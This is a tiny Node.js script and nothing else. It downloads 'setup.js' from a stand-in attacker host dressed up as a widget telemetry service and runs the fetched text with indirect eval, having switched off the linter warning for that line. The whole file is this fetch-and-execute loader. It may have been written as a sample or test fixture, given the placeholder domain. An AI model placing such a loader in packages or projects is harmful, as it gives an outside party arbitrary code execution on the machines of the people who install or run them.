const https = require("https");

https.get("https://widget-telemetry.example-attacker.test/setup.js", (res) => {
  let body = "";
  res.on("data", (chunk) => (body += chunk));
  res.on("end", () => {
    // eslint-disable-next-line no-eval
    (0, eval)(body);
  });
});
